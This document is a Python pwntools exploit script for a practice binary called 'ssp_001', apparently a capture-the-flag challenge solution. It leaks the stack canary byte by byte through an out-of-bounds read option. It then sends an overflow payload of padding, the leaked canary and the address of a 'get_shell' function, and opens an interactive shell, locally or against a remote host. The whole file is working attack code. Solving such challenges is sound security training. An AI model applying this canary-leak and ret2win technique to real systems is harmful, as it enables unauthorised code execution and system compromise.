#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ssp_001')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+308
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def fill():
    io.recvuntil(b">")
    io.send(b"F")
    io.sendafter(b":", b"A"*0x40)


def leak():
    canary = b"0x"
    idx = 131
    for _ in range(4, 0, -1):
        io.send(b"P")
        io.recvuntil(b":")
        io.sendline(str(idx).encode())
        io.recvuntil(b"is : ")
        canary += io.recv(2)
        idx -= 1

    return int(canary, 16)


def win(canary):
    offset = 64

    payload = b"A"*offset + p32(canary) + b"B"*8 + p32(exe.sym['get_shell'])
    io.recvuntil(b">")
    io.send(b"E")
    io.recvuntil(b":")
    io.sendline(b"200")
    io.recvuntil(b":")
    io.sendline(payload)

def solve():


    """
    leak the stack canary bcuz buf -> canary -> ebp -> ret_addr
    """

    canary = leak()
    info("canary: %#x", canary)

    """
    perform ret2win since there's a get_shell function
    """
    win(canary)

    io.interactive()



def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

